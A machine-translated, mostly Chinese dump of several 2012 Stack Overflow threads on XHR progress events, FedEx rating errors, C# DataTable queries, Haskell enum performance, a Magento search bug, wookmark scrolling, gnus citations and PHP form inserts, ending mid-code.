该`onprogress`事件是 XMLHttpRequest Level 2 规范的一部分...

*   [http://www.w3.org/TR/XMLHttpRequest2/](http://www.w3.org/TR/XMLHttpRequest2/)

*   [http://www.w3.org/TR/XMLHttpRequest2/#event-handlers](http://www.w3.org/TR/XMLHttpRequest2/#event-handlers)

... IE 9 及以下版本不支持。但是，IE 10 应该支持它...

*   [http://msdn.microsoft.com/en-us/library/ie/hh673569(v=vs.85).aspx#Enhanced_Event_Support](http://msdn.microsoft.com/en-us/library/ie/hh673569(v=vs.85).aspx#Enhanced_Event_Support)

有关哪些浏览器支持 XHR Level 2 的更多信息，请访问 caniuse.com...

*   [http://caniuse.com/#feat=xhr2](http://caniuse.com/#feat=xhr2)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-12T20:09:17.710

IE9 及以下不支持 onprogress，因此您无法使其正常工作。

```
var xhr = new XMLHttpRequest();
console.log('onprogress' in xhr); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:14:49.433

您可以使用该`onreadystatechange`事件并显示您的信息。我只是建议将其作为一种解决方法。

```
xhr.onreadystatechange=function() {
    if (xhr.readyState != 4) {
        // Display a progress message here.
    } else if (xhr.readyState==4 && xhr.status==200) {
        // Request is finished, do whatever here.
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-12T20:22:49.483

添加到建议列表，如果在您的项目中使用 JQuery。可以通过下面的函数来实现，当然需要JQuery $.ajax 请求。这些客户端库的优点是它们具有基于浏览器实例化的对象。例如：JQuery 基于浏览器处理“ActiveXObject("Msxml2.XMLHTTP")”或“ActiveXObject("Microsoft.XMLHTTP")”。

```
//displays progress bar
$('#info').ajaxStart(function () {
    $(this).show();
}).ajaxStop(function () {
    $(this).hide();
}); 
```

# php - FEDEX 评级服务 - FEDEX_GROUND 与 GROUND_HOME_DELIVERY

> ID：12866268
> 
> 赞同：1
> 
> 时间：2012-10-12T20:01:40.357
> 
> 标签：php, soap, fedex

当我使用 FEDEX_GROUND 发送请求时，我收到此错误。是否有一种解决方法可以在不明确查找此错误并重试请求的情况下切换运输方式？

```
Array
(
[HighestSeverity] => ERROR
[Notifications] => Array
    (
        [0] => Array
            (
                [Severity] => ERROR
                [Source] => crs
                [Code] => 924
                [Message] => This shipment qualifies for FedEx Home Delivery.  Please resubmit your request with serviceType Ground Home Delivery.
                [LocalizedMessage] => This shipment qualifies for FedEx Home Delivery.  Please resubmit your request with serviceType Ground Home Delivery.
            )

        [1] => Array
            (
                [Severity] => WARNING
                [Source] => crs
                [Code] => 304
                [Message] => Requested shipment package count did not match the summed total of group package count values; the summed total of group package count values was used to rate.
                [LocalizedMessage] => Requested shipment package count did not match the summed total of group package count values; the summed total of group package count values was used to rate.
            )

    )

[Version] => Array
    (
        [ServiceId] => crs
        [Major] => 10
        [Intermediate] => 0
        [Minor] => 0
    )

) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T17:17:25.490

在执行标签请求之前，如果 service = Ground 且 res=True，那么您应该将服务切换到 Ground Home Delivery。这将解决错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-21T00:21:48.703

当 PackageCount 不代表 RequestedPackageLineItems 的数量时，我已经遇到了这个错误。

```
<ns1:PackageCount>2</ns1:PackageCount>

<ns1:RequestedPackageLineItems><...>
<ns1:RequestedPackageLineItems><...> 
```

如果您有 2 个 RequestedPackageLineItems，请将 PackageCount 设置为 2。

# xpages - “快速查找”查看？

> ID：12866273
> 
> 赞同：1
> 
> 时间：2012-10-12T20:01:55.257
> 
> 标签：xpages

我意识到我可以在第一个排序列上过滤视图，但是有没有办法模仿客户端的“快速查找”功能？基本上是视图的“快进”。如果用户将在第一列中键入全部或部分值，则视图将定位到适当的文档，但所有其他文档仍保留在视图中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-16T06:10:38.777

您可以为此使用 startkey 参数并刷新包含输入字段和视图的面板。警告：这种方法会在网络和服务器端产生大量喋喋不休。[使用 Dojo 网格和Dojo Search](https://dojotoolkit.org/reference-guide/1.8/dojox/grid/EnhancedGrid/plugins/Search.html)可能会更好。

# c# - 公共数据表中的 C# SQL 查询

> ID：12866274
> 
> 赞同：1
> 
> 时间：2012-10-12T20:02:16.030
> 
> 标签：c#, sql

我有这个我试图在其中运行 sql 查询的公共 DataTable，但是该死的东西不会工作......

```
public DataTable get_OrderTransaction_Master_ByOrderID(Int64 orderID)
    {
        cn = new SqlConnection(objCommon.IpcConnectionString);
        cmd = new SqlCommand("select * from dbo.OrderTransaction_Master where orderID = " + orderID, cn);
        cmd.CommandType = CommandType.Text;
        cn.Open();
        cmd.ExecuteNonQuery();
        cn.Close();
    } 
```

`get_OrderTransaction_Master_ByOrderID`我在说下面有一条红线

```
Error   3   'OrderTransaction_Master.get_OrderTransaction_Master_ByOrderID(long)': not all code paths return a value    C:\IPC\App_Code\OrderTransaction_Master.cs  32  22  http://localhost/ipc/ 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-12T20:03:03.067

您的方法的返回类型是 a `DataTable`，但您的方法中没有 return 语句。您也在执行`cmd.ExecuteNonQuery()`，您应该在哪里执行`cmd.ExecuteReader()`并加载一个`DataTable`

```
public DataTable get_OrderTransaction_Master_ByOrderID(Int64 orderID)
{
    DataTable dt = new DataTable();
    using(var cn = new SqlConnection(objCommon.IpcConnectionString))
    {
        using(var cmd = new SqlCommand(
            "select * from dbo.OrderTransaction_Master where orderID = " + orderID, cn))
        {
            cmd.CommandType = CommandType.Text;
            cn.Open();
            using(SqlDataReader reader = cmd.ExecuteReader())
            {
                dt.Load(reader);            
                return dt;
            }
        }
    }
} 
```

我把`SqlConnection`,`SqlCommand`和`SqlDataReader`放在`using`语句中。一旦退出 using 语句，这将正确处理对象（关闭连接等）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T23:33:53.690

您的返回类型是 DataTable 但您的函数不返回任何内容。

2件事，把函数改成void，或者返回一个dataTable

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2014-05-20T15:07:32.900

这种方法将无休止地帮助你。这是我的宝贝，是一个真正的美女。

它接受您的 SQLQuery 作为参数并返回一个 DataTable 对象：

```
public DataTable DBGetDataTable(string SQLQuery)
{
    string MethodName = "public DataTable DBGetDataTable(string SQLQuery)";
    DataTable Result = null;
    SqlConnection SqlConnection = null;
    SqlCommand SqlCommand = null;
    try
    {
        string DatabaseName = "";
        string ServerNameOrIP = "";
        string DatabaseUserID = "";
        string Password = "";

        string ConnectionString = "database=" + DatabaseName + ";server=" + ServerNameOrIP + ";user ID=" + DatabaseUserID + ";PWD=" + Password + ";Connection Timeout=5000";

        SqlConnection = new SqlConnection(ConnectionString);

        SqlCommand = new SqlCommand(SQLQuery, SqlConnection);

        SqlConnection.Open();

        SqlDataReader SqlDataReader = SqlCommand.ExecuteReader();

        if (SqlDataReader.HasRows)
        {
            DataTable Dt = new DataTable();

            Dt.Load(SqlDataReader);

            Result = Dt;

        }

    }
    catch (Exception ex)
    {
        //Common.Exception(ClassName, MethodName, ex);
    }
    finally
    {
        SqlConnection.Close();
        SqlConnection.Dispose();
        SqlConnection = null;

        SqlCommand.Dispose();
        SqlCommand = null;

    }
    return Result;
} 
```

由于您的数据库凭据与我的不同，您需要在上述代码中为以下变量提供值：

*   字符串数据库名称 = "";
*   字符串 ServerNameOrIP = "";
*   字符串数据库用户 ID = "";
*   字符串密码 = "";

它非常有弹性，并且可以非常有效地自行清理，因此专为大量数据库使用而设计。

这是一个使用它的例子：

```
 StringBuilder sbSQL = new StringBuilder();

    sbSQL.AppendLine(" SET DATEFORMAT DMY");

    sbSQL.AppendLine(" SELECT");
    sbSQL.AppendLine("      TillPayment.TillPaymentId As Id");
    sbSQL.AppendLine("    , TillPayment.TransactionGuid As TransactionCode");
    sbSQL.AppendLine("    , TillPayment.Amount As Price");
    sbSQL.AppendLine("    , TillPayment.DiscountPercentage");
    sbSQL.AppendLine("    , TillPayment.Processed As ProcessedDate");
    sbSQL.AppendLine("    , PaymentType.Name As PaymentType");
    sbSQL.AppendLine("    , TillPayment.ItemType As Item");
    sbSQL.AppendLine("    , TillUser.LoginCode As Login");
    sbSQL.AppendLine("    , TillUser.Name As UserName");
    sbSQL.AppendLine("    , TillPayment.TillName As Till");

    sbSQL.AppendLine(" FROM");
    sbSQL.AppendLine("    [tblTillPayment] TillPayment");
    sbSQL.AppendLine("    INNER JOIN [tblPaymentType] PaymentType ON TillPayment.PaymentTypeId = PaymentType.PaymentTypeId");
    sbSQL.AppendLine("    INNER JOIN [tblTillUser] TillUser ON TillPayment.TillLoginCode = TillUser.LoginCode");

    int SelectedMonthFrom = GetMonthAsNumber(CboMonthReportMonth.SelectedItem.Text);

    int SelectedYearFrom = int.Parse(CboMonthReportYear.SelectedItem.Text);

    int SelectedMonthTo = SelectedMonthFrom == 12 ? 1 : SelectedMonthFrom + 1;

    int SelectedYearTo = SelectedMonthTo == 1 ? SelectedYearFrom + 1: SelectedYearFrom;

    sbSQL.AppendLine(" WHERE");
    sbSQL.AppendLine("    Processed >= '01-" + SelectedMonthFrom + "-" + SelectedYearFrom + " 00:00'");
    sbSQL.AppendLine("    AND Processed < '01-" + SelectedMonthTo + "-" + SelectedYearTo + " 00:00'");

    sbSQL.AppendLine(" AND NOT(TillUser.LoginCode = '2503' or TillUser.LoginCode = '1453')");

    sbSQL.AppendLine(" ORDER BY");
    sbSQL.AppendLine("    Till");
    sbSQL.AppendLine("    , Processed");

    DataTable DtReport = DBGetDataTable(sbSQL.ToString()); 
```

当然，您的 SQL 查询将与我的不同。

请注意，我使用了 StringBuilder 对象，但如果您更愿意直接写入字符串，那么您可以这样做。

你写了

> 我仍然得到相同的错误错误 3 'OrderTransaction_Master.get_OrderTransaction_Master_ByOrderID(long)': 并非所有代码路径都返回值 C:\IPC\App_Code\OrderTransaction_Master.cs 33 22 http://localhost/ipc/ 从之前

这表明名为 OrderTransaction get_OrderTransaction_Master_ByOrderID(long OrderId) 的方法没有默认返回值

我想有问题的方法应该如下所示：

```
 public OrderTransaction get_OrderTransaction_Master_ByOrderID(long OrderId)
    {
        string MethodName = "public OrderTransaction get_OrderTransaction_Master_ByOrderID(long OrderId)";
        OrderTransaction Result = null;
        try{
            StringBuilder sbSQL = new StringBuilder();

            sbSQL.AppendLine(" SELECT");
            sbSQL.AppendLine("    *");

            sbSQL.AppendLine(" FROM");
            sbSQL.AppendLine("    dbo.OrderTransaction_Master");

            sbSQL.AppendLine(" WHERE");
            sbSQL.AppendLine("    OrderID = " + OrderID);

            DataTable Dt = DBGetDataTable(sbSQL.ToString())

            OrderTransaction OrderTransaction = new OrderTransaction(Dt);

            Result = OrderTransaction;

        }
        catch(Exception ex)
        {
            //Common.Exception(ClassName,MethodName,ex);
        }
        return Result;
    } 
```

请询问您是否有任何问题。

# haskell - 新类型比枚举快吗？

> ID：12866291
> 
> 赞同：22
> 
> 时间：2012-10-12T20:03:24.143
> 
> 标签：haskell, ghc

根据[这篇文章](http://www.haskell.org/haskellwiki/Performance/Data_types)，

> 就 GHC 而言，枚举不算作单构造函数类型，因此当用作严格构造函数字段或严格函数参数时，它们不会从解包中受益。这是 GHC 的一个缺陷，但可以解决。

而是建议使用新类型。但是，我无法使用以下代码验证这一点：

```
{-# LANGUAGE MagicHash,BangPatterns #-}
{-# OPTIONS_GHC  -O2 -funbox-strict-fields -rtsopts -fllvm -optlc --x86-asm-syntax=intel #-}
module Main(main,f,g)
where       
import GHC.Base  
import Criterion.Main

data D = A | B | C
newtype E = E Int deriving(Eq)

f :: D -> Int#
f z | z `seq` False = 3422#
f z = case z of
  A -> 1234#
  B -> 5678#
  C -> 9012#

g :: E -> Int#
g z | z `seq` False = 7432#
g z = case z of
  (E 0) -> 2345#
  (E 1) -> 6789#
  (E 2) -> 3535#

f' x = I# (f x)
g' x = I# (g x)

main :: IO ()
main = defaultMain [ bench "f" (whnf f' A) 
                   , bench "g" (whnf g' (E 0)) 
                   ] 
```

Looking at the assembly, the tags for each constructor of the enumeration D is actually unpacked and directly hard-coded in the instruction. Furthermore, the function `f` lacks error-handling code, and more than 10% faster than `g`. In a more realistic case I have also experienced a slowdown after converting a enumeration to a newtype. Can anyone give me some insight about this? Thanks.

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-10-12T21:03:30.107

It depends on the use case. For the functions you have, it's expected that the enumeration performs better. Basically, the three constructors of `D` become `Int`s resp. `Int#`s when the strictness analysis allows that, and GHC knows it's statically checked that the argument can only have one of the three values `0#, 1#, 2#`, so it needs not insert error handling code for `f`. For `E`, the static guarantee of only one of three values being possible isn't given, so it needs to add error handling code for `g`, that slows things down significantly. If you change the definition of `g` so that the last case becomes

```
E _ -> 3535# 
```

the difference vanishes completely or almost completely (I get a 1% - 2% better benchmark for `f` still, but I haven't done enough testing to be sure whether that's a real difference or an artifact of benchmarking).

But this is not the use case the wiki page is talking about. What it's talking about is unpacking the constructors into other constructors when the type is a component of other data, e.g.

```
data FooD = FD !D !D !D

data FooE = FE !E !E !E 
```

Then, if compiled with `-funbox-strict-fields`, the three `Int#`s can be unpacked into the constructor of `FooE`, so you'd basically get the equivalent of

```
struct FooE {
    long x, y, z;
}; 
```

while the fields of `FooD` have the multi-constructor type `D` and cannot be unpacked into the constructor `FD`^((1)), so that would basically give you

```
struct FooD {
    long *px, *py, *pz;
} 
```

That can obviously have significant impact.

I'm not sure about the case of single-constructor function arguments. That has obvious advantages for types with contained data, like tuples, but I don't see how that would apply to plain enumerations, where you just have a `case` and splitting off a worker and a wrapper makes no sense (to me).

Anyway, the worker/wrapper transformation isn't so much a single-constructor thing, constructor specialisation can give the same benefit to types with few constructors. (For how many constructors specialisations would be created depends on the value of `-fspec-constr-count`.)

* * *

^((1)) That might have changed, but I doubt it. I haven't checked it though, so it's possible the page is out of date.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-12T20:48:39.377

I would guess that GHC has changed quite a bit since that page was last updated in 2008\. Also, you're using the LLVM backend, so that's likely to have some effect on performance as well. GHC can (and will, since you've used `-O2`) strip any error handling code from `f`, because it knows statically that `f` is total. The same cannot be said for `g`. I would guess that it's the LLVM backend that then unpacks the constructor tags in `f`, because it can easily see that there is nothing else used by the branching condition. I'm not sure of that, though.

# php - 搜索项目时出现 Magento 错误

> ID：12866292
> 
> 赞同：0
> 
> 时间：2012-10-12T20:03:25.500
> 
> 标签：php, mysql, sql, magento, indexing

我正在使用 Magento 1.7.0.2，我严重陷入了这个问题。问题是，当我第一次搜索该术语时，它没有显示任何内容，你可以[在这里](http://stagerightlighting.com/catalogsearch/result/?q=gem)看到它这是我第一次搜索术语 gem 时

，当我再次搜索同一个词时，Magento 显示以下错误

```
SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '1-512' for key 'PRIMARY'

Trace:
#0 /home/stagerig/public_html/includes/src/Varien_Db_Statement_Pdo_Mysql.php(110): Zend_Db_Statement_Pdo->_execute(Array)
#1 /home/stagerig/public_html/includes/src/__default.php(63012): Varien_Db_Statement_Pdo_Mysql->_execute(Array)
#2 /home/stagerig/public_html/includes/src/__default.php(52694): Zend_Db_Statement->execute(Array)
#3 /home/stagerig/public_html/includes/src/__default.php(53730): Zend_Db_Adapter_Abstract->query('INSERT INTO srl...', Array)
#4 /home/stagerig/public_html/includes/src/__default.php(54566): Zend_Db_Adapter_Pdo_Abstract->query('INSERT INTO srl...', Array)
#5 /home/stagerig/public_html/includes/src/MageCoders_DefaultSearch_Model_Mysql4_Fulltext.php(27): Varien_Db_Adapter_Pdo_Mysql->query('INSERT INTO srl...')
#6 /home/stagerig/public_html/includes/src/Mage_CatalogSearch_Model_Fulltext.php(136): MageCoders_DefaultSearch_Model_Mysql4_Fulltext->prepareResult(Object(Mage_CatalogSearch_Model_Fulltext), 'gem', Object(Mage_CatalogSearch_Model_Query))
#7 /home/stagerig/public_html/includes/src/Mage_CatalogSearch_Model_Resource_Fulltext_Collection.php(55): Mage_CatalogSearch_Model_Fulltext->prepareResult()
#8 /home/stagerig/public_html/includes/src/Mage_CatalogSearch_Model_Layer.php(58): Mage_CatalogSearch_Model_Resource_Fulltext_Collection->addSearchFilter('gem')
#9 /home/stagerig/public_html/includes/src/Mage_CatalogSearch_Model_Layer.php(42): Mage_CatalogSearch_Model_Layer->prepareProductCollection(Object(Mage_CatalogSearch_Model_Resource_Fulltext_Collection)) 
```

这些只是前几行，不是完整的，所有其他错误本质上都是相同的，表明文件存在一些问题......

我调查了这个问题，发现在

1.  `catalogsearch_result`magento 数据库中的表有一个名为 PRIMARY 的索引，并且由于该表而发生错误
2.  `catalogsearch_quer`y表记录搜索词
3.  `1062 Duplicate entry '1-512' for key '`PRIMARY 1是`'`搜索查询词 ID 和数据库，512 是与 gem 查询工作相关的产品 ID
4.  我认为当 catalogusearch_result 表尝试再次更新查询字符串时会发生此错误，因为记录已经存在，因此会弹出此错误...

**DONE SO FAR..** 5\. 我清空了数据库中的所有日志表

1.  我清空了 catalogsearch_results 和 catalogsearch_query 表，但再次弹出此错误

2.  我下载了正确的magento版本，甚至替换了完整的`catalagsearch`文件夹，但没有白费..

3.  我试过`re-indexing`了，完全清除magento缓存（通过后端管理员和手动删除`var`文件夹）

4.  三重禁用`CATALOGSEARCH`模块并重新启用它...

5.  尝试从 magento 论坛和谷歌搜索获得帮助，但没有任何证据证明对我有帮助......

我已经尝试了每一个选择，或者我知道，过去 4 天我一直在敲我的头，但一切都是徒劳的......

有人可以帮我吗，谢谢

**为艾伦**

```
class MageCoders_DefaultSearch_Model_Mysql4_Fulltext extends Mage_CatalogSearch_Model_Mysql4_Fulltext{

    public function prepareResult($object, $queryText, $query)
    {   
         $adapter = $this->_getWriteAdapter();

         if ($query->getIsProcessed()) { return $this; }
         $mainTable = $this->getTable('catalogsearch/result');
         $queryText = mysql_escape_string(trim($queryText));    
         $product = Mage::getModel('catalog/product')->loadByAttribute('sku',$queryText);   
         if($product){
            $sql = "INSERT INTO {$mainTable} SET query_id = '".$query->getId()."',
                                                 product_id = '".$product->getId()."',
                                                 relevance = '2'";
            $adapter->query($sql);                                   
         }else{
            $name = '%'.$queryText.'%';
            $collection = Mage::getResourceModel('catalog/product_collection')
                                ->addAttributeToFilter('name',array('like'=>$name));

            if($collection->count()){   
                foreach($collection as $item){
                        $sql = "INSERT INTO {$mainTable} SET query_id = '".$query->getId()."',
                                                             product_id = '".$item->getId()."',
                                                             relevance = '1'";
                        $adapter->query($sql);                                   
                }
            }                   
         }

    } 
```

这是您提到的文件中的代码，

对我来说，数据传递正确，有逻辑错误或类似的东西，不太确定

看看你能不能多指导我一点..

谢谢..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:16:38.833

简短版：停止使用该`MageCoders_DefaultSearch`模块。这个模块是

1.  与您的 Magento 版本不兼容

2.  与您安装的其他扩展不兼容

3.  与错误插入系统的某些数据不兼容。

长版：

看看你的回溯，特别是这一行

```
#5 /home/stagerig/public_html/includes/src/MageCoders_DefaultSearch_Model_Mysql4_Fulltext.php(27): Varien_Db_Adapter_Pdo_Mysql->query('INSERT INTO srl...') 
```

这个错误源于`MageCoders_DefaultSearch_Model_Mysql4_Fulltext`资源模型的方式。具体来说，它试图以与数据库关系规则不兼容的方式将数据添加到您的系统中。这不是默认的 Magento 资源模型。看来`MageCoders_DefaultSearch`模块已经重写了`prepareResult`方法。您需要检查此方法中的代码并确定此代码中是否存在逻辑错误，以及此代码是否从其他地方接收到无效信息。

**更新**：（此外，[Magento 1.7 似乎不支持](http://www.magecoders.com/index.php/enhanced-default-search-for-magento.html)此扩展）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T21:30:56.300

@newbee 如果我建议仅卸载此扩展程序，您会成功吗？您的代码与原始 magento 文件中实现的代码基本相同。唯一的方法不是那么好。此代码将 query_id、product_id 和相关性插入到 catalogsearch_results 表中。问题是对于每个搜索查询都会执行此查询，结果中至少有一个产品。

对 query_id-product_id 应该是唯一的。但每次客户发送搜索查询时，扩展都会尝试添加新行。

标准的 magento 全文资源检查重复并使用“ON DUPLICATE KEY UPDATE”指令进行插入。因此避免了查询重复。

# php - 如何在创建布局之前使 wookmark 插件预加载图像

> ID：12866307
> 
> 赞同：0
> 
> 时间：2012-10-12T20:04:24.360
> 
> 标签：php, javascript, jquery, ajax, database

当用户滚动到页面底部时，我从 wookmark 插件改编了这个脚本以从数据库加载更多项目。

最初它预加载图像，然后创建布局，但是当用户滚动到底部时，新项目通过 ajax 加载，但图像都相互重叠。

我正在使用 imagesloaded jquery 插件来让图像在第一次加载页面时正确显示，但是当用户滚动到底部时添加新项目时我无法让它工作。

这是我的代码：

```
 $(document).imagesLoaded(function() {
     $(document).ready(new function() {

       // Prepare layout options.
       var options = {
         autoResize: true, // This will auto-update the layout when the browser window is resized.
         container: $('#main'), // Optional, used for some extra CSS styling
         offset: 10, // Optional, the distance between grid items
         itemWidth: 320 // Optional, the width of a grid item
       };

       // Get a reference to your grid items.
       var handler = $('#tiles li');

       // Call the layout function.
       handler.wookmark(options);

       // When scrolled all the way to the bottom, add more tiles.
        var int = 10;

        function onScroll(event) {
          // Check if we're within 100 pixels of the bottom edge of the broser window.
          var closeToBottom = ($(window).scrollTop() + $(window).height() > $(document).height() - 100);

          if(closeToBottom) {

             // GET THE 10 NEXT ITEMS;
              if (window.XMLHttpRequest)
                 {// code for IE7+, Firefox, Chrome, Opera, Safari
                 xmlhttp=new XMLHttpRequest();
                 }
               else
                 {// code for IE6, IE5
                 xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
                 }
               xmlhttp.onreadystatechange=function()
                 {
                 if (xmlhttp.readyState==4 && xmlhttp.status==200)
                   {
                   //document.getElementById("tiles").innerHTML=xmlhttp.responseText;

                         $('#tiles').append(innerHTML=xmlhttp.responseText);
                         int = int+10;
                         // Clear our previous layout handler.
                         if(handler) handler.wookmarkClear();

                         // Create a new layout handler.
                         handler = $('#tiles li');
                         handler.wookmark(options);

                   }
                 }

               $.extend({
                    getUrlVars: function(){
                      var vars = [], hash;
                      var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
                      for(var i = 0; i < hashes.length; i++)
                      {
                        hash = hashes[i].split('=');
                        vars.push(hash[0]);
                        vars[hash[0]] = hash[1];
                      }
                      return vars;
                    },
                    getUrlVar: function(name){
                      return $.getUrlVars()[name];
                    }
                  });

                  var request = $.getUrlVar('item');

                  if(request!=null){
                    var allR = "?int="+int+"&item="+request;
                  } else {
                    var allR = "?int="+int;
                  }

               xmlhttp.open("GET","tiles.php"+allR,true);
               xmlhttp.send();
          }
        };

        $(document).ready(new function() {
          // Capture scroll event.
          $(document).bind('scroll', onScroll);

          // Call the layout function.
          handler = $('#tiles li');
          handler.wookmark(options);
        });      
     });  
   }); 
```

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-28T17:21:02.447

最后我忘了尝试最简单的方法，将 handler.wookmark 包装在 imagesLoaded 中： `$(document).imagesLoaded(function() { handler.wookmark(options); });`

完整代码：

```
$(document).imagesLoaded(function() {
     $(document).ready(new function() {

       // Prepare layout options.
       var options = {
         autoResize: true, // This will auto-update the layout when the browser window is resized.
         container: $('#main'), // Optional, used for some extra CSS styling
         offset: 10, // Optional, the distance between grid items
         itemWidth: 320 // Optional, the width of a grid item
       };

       // Get a reference to your grid items.
       var handler = $('#tiles li');

       // Call the layout function.
       handler.wookmark(options);

       // When scrolled all the way to the bottom, add more tiles.
        var int = 10;

        function onScroll(event) {
          // Check if we're within 100 pixels of the bottom edge of the broser window.
          var closeToBottom = ($(window).scrollTop() + $(window).height() >     $(document).height() - 100);

          if(closeToBottom) {

             // GET THE 10 NEXT ITEMS;
              if (window.XMLHttpRequest)
                 {// code for IE7+, Firefox, Chrome, Opera, Safari
                 xmlhttp=new XMLHttpRequest();
                 }
               else
                 {// code for IE6, IE5
                 xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
                 }
               xmlhttp.onreadystatechange=function()
                 {
                 if (xmlhttp.readyState==4 && xmlhttp.status==200)
                   {
                   //document.getElementById("tiles").innerHTML=xmlhttp.responseText;

                         $('#tiles').append(innerHTML=xmlhttp.responseText);

                         int = int+10;
                         // Clear our previous layout handler.
                         if(handler) handler.wookmarkClear();

                         // Create a new layout handler.
                         handler = $('#tiles li');

                         $(document).imagesLoaded(function() {
                         handler.wookmark(options);
                       });

                         $(function() {
                            // Select all links whose attribute rel starts with lightbox
                            $('a[rel^=lightbox]').lightBox();
                         });

                         var scripts = domElement.getElementsByTagName("script");
                           for (var i = 0; i < scripts; i ++) {
                               eval(scripts[i].text);
                           }

                   }

            } 
               $.extend({
                    getUrlVars: function(){
                      var vars = [], hash;
                      var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
                      for(var i = 0; i < hashes.length; i++)
                      {
                        hash = hashes[i].split('=');
                        vars.push(hash[0]);
                        vars[hash[0]] = hash[1];
                      }
                      return vars;
                    },
                    getUrlVar: function(name){
                      return $.getUrlVars()[name];
                    }
                  });

                  var request = $.getUrlVar('item');

                  if(request!=null){
                    var allR = "?int="+int+"&item="+request;
                  } else {
                    var allR = "?int="+int;
                  }

if(end==0){
               xmlhttp.open("GET","tiles.php"+allR,true);
               xmlhttp.send();
             }

             }

        };

        $(document).ready(new function() {
          // Capture scroll event.
          $(document).bind('scroll', onScroll);

          // Call the layout function.
          handler = $('#tiles li');
          handler.wookmark(options);

        });      
     });

   }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T21:21:47.483

我建议你使用getJson、getAjax 之类的jquery ajax 函数。

# emacs - 使用 emacs 和 gnus 在引用的回复中包含原始消息的日期和时间

> ID：12866308
> 
> 赞同：9
> 
> 时间：2012-10-12T20:04:26.010
> 
> 标签：emacs, gnus

当我使用其中一个`*-with-original`函数在 emacs 中使用`gnus`( `message`) 回复消息时，我得到类似于以下的引用：

```
"Doe, John" <johndoe@example.com> writes:

> Lorem ipsum dolor sit amet, consectetuer adipiscing elit.
> Consectetuer adipiscing elit. Lorem ipsum dolor sit
> amet, consectetuer adipiscing elit. 
```

我希望 gnus 的行为类似于其他 MUA，包括原始消息的日期和时间，例如：

```
On Thu 11 October 2012 09:20:12 "Doe, John" <johndoe@example.com> wrote:

> Lorem ipsum dolor sit amet, consectetuer adipiscing elit.
> Consectetuer adipiscing elit. Lorem ipsum dolor sit
> amet, consectetuer adipiscing elit. 
```

有没有办法改变引用的风格来实现这一点？

* * *

**更新 2：**我现在使用更简单的解决方案，来自 kindahero 的回答：

```
(setq message-citation-line-function 'message-insert-formatted-citation-line)
(setq message-citation-line-format "On %a, %b %d %Y at %r, %f wrote:") 
```

* * *

**更新 1：**根据 perh 的回答，我最终得到了以下解决方案：

```
(defun my-citation-line ()
  "Inserts name, email, and date"
  (when message-reply-headers
    (insert "On "
        (format-time-string "%a, %b %e, %Y at %r"
                (date-to-time (mail-header-date message-reply-headers)))
        ", "
        (or (gnus-extract-address-component-name (mail-header-from message-reply-headers))
        "Somebody")
        (format " <%s>"
            (or (gnus-extract-address-component-email (mail-header-from message-reply-headers))
            "somebody@example.com"))
        " wrote:\n")))

(setq message-citation-line-function 'my-citation-line) 
```

最终结果如下所示：

```
On Fri, Oct 12, 2012 at 03:11:48 PM, John Doe <johndoe@example.com> wrote: 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-14T10:19:04.753

实际上 gnus 为你提供了格式化函数。

```
(setq message-citation-line-function 'message-insert-formatted-citation-line)
(setq message-citation-line-format "On %a, %b %d %Y, %f wrote:\n") 
```

根据您的喜好更改变量.. `format-time-string' 有选项列表

.emacs 中的行更少:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-12T20:20:32.137

您可以将 message-citation-line-function 设置为插入标题的合适函数：

```
(setq message-citation-line-function 'my-citation-line) 
```

例如，此函数给出名称和未标准化的日期：

```
(defun my-citation-line ()
   "Inserts name and date"
   (when message-reply-headers
     (insert 
        (or (gnus-extract-address-component-name
         (mail-header-from message-reply-headers))
            "Somebody")
       ", "
       (mail-header-date message-reply-headers)))
       "\n"))) 
```

# php - 如何正确发布和插入值到数据库中？

> ID：12866313
> 
> 赞同：0
> 
> 时间：2012-10-12T20:04:44.233
> 
> 标签：php, database, mysqli

我想使用这种格式的多维数组：value[n][]，其中 n 是问题编号。使用这个新设置，您最终应该得到以下复选框字段：

```
<input type="checkbox" value="A" name="value[1][]">
<input type="checkbox" value="B" name="value[1][]">
<input type="checkbox" value="A" name="value[2][]">
<input type="checkbox" value="C" name="value[2][]">
<input type="checkbox" value="E" name="value[2][]"> 
```

请注意，所选值在 value 属性中编码。name 属性只包含该值所属的问题。

因此，上述输入说明的是：

```
question 1: answer: A
question 1: answer: B
question 2: answer: A
question 2: answer: C
question 2: answer: E 
```

我想将这些详细信息插入到下面的“问题”和“答案”数据库表中：

问题表：

```
SessionId    QuestionId

MUL             1
MUL             2 
```

答案表：

```
 AnswerId (auto)  SessionId  QuestionId   Answer
 1                MUL        1            A
 2                MUL        1            B
 3                MUL        2            A
 4                MUL        2            C
 5                MUL        2            E 
```

现在我尝试编写下面的 mysqli/php 代码将这些值插入数据库，但我收到错误并且在想要实现我想要实现的目标方面失败了。我需要帮助才能在相关表中正确插入正确的值。

以下是 php/mysqli 代码：

```
var_dump($_POST);  

$i = 0;
$c = count($_POST['numQuestion']);

for($i = 0;  $i < $c; $i++ ){

/*
    switch ($_POST['gridValues'][$i]){

    case "3": 
    $selected_option = "A-C";
    break;

    case "4": 
    $selected_option = "A-D";
    break;

    case "5": 
    $selected_option = "A-E";
    break;

    default:
    $selected_option = "";
